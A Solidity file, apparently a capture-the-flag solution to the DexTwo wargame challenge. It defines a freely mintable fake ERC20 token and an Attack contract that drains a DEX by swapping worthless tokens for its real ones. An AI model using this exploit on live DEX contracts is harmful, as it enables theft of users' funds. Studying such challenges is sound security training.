// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {DexTwo} from "./DexTwo.sol";

contract FakeToken is IERC20 {
    string public name = "FakeToken";
    string public symbol = "FTK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(address account, uint256 amount) external {
        totalSupply += amount;
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

}

contract Attack {
    DexTwo dex;
    FakeToken token1;
    FakeToken token2;


    constructor(address _dex) {
        dex = DexTwo(_dex);
        token1 = new FakeToken();
        token2 = new FakeToken();

        token1.mint(address(this), 2);
        token2.mint(address(this), 2);

    }

    function attack() public {
        token1.transfer(address(dex), 1);
        token2.transfer(address(dex), 1);

        token1.approve(address(dex), 1);
        token2.approve(address(dex), 1);

        dex.swap(address(token1), address(dex.token1()), 1);
        dex.swap(address(token2), address(dex.token2()), 1);
    }
}